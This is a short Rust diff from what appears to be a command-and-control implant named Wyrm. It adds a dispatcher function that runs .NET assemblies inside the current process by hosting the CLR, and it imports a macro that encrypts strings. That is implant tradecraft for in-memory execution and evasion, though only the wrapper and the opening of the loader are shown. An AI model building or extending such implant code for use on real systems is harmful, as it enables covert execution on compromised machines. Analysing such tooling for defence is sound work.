@@ -1,5 +1,7 @@
 use std::{ffi::c_void, ptr::null_mut};
 
+use shared::tasks::WyrmResult;
+use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::System::{
         ClrHosting::{CLRCreateInstance, CorRuntimeHost},
@@ -62,7 +64,22 @@ const GUID_APP_DOMAIN: GUID = GUID {
     data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
 };
 
-pub fn execute_dotnet() -> Result<(), DotnetError> {
+/// Entry function for executing dotnet binaries in the current process.
+///
+/// For simplicity, we accept the metadata un-decoded so the main dispatcher doesn't need to
+/// concern itself with the intrinsics. This function will handle that.
+pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<String> {
+    if metadata.is_none() {
+        return WyrmResult::Err(sc!("No metadata received with command.", 87).unwrap());
+    }
+
+    match execute_dotnet_assembly() {
+        Ok(_) => WyrmResult::Ok(String::from("Assembly running..")),
+        Err(_) => WyrmResult::Err(String::from("Error received during execution")),
+    }
+}
+
+fn execute_dotnet_assembly() -> Result<(), DotnetError> {
     //
     // Load the CLR into the process and setup environment to support
     //
